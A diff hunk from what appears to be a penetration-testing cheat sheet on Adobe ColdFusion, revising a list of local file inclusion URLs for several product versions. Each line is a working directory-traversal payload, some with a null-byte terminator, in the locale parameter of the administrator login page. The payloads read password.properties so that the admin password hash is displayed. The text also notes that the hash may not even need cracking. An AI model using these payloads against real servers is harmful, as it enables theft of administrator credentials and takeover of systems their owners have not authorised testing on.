@@ -82,19 +82,23 @@ If the local file inclusion could be successfully exploited, the password SHA1
 hash will be displayed on the administrative login page.
 
 ```
+# <http | https>://<HOSTNAME>:<PORT>/<...>
+
 # ColdFusion 6
-<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en
 
 # ColdFusion 7
-
-<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en
 
 # ColdFusion 8
-
-<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
 
 # All versions
-<http | https>://<HOSTNAME>:<PORT>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en
+/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en
 ```
 
 Note that, in some cases, the hash does not need to be cracked as a
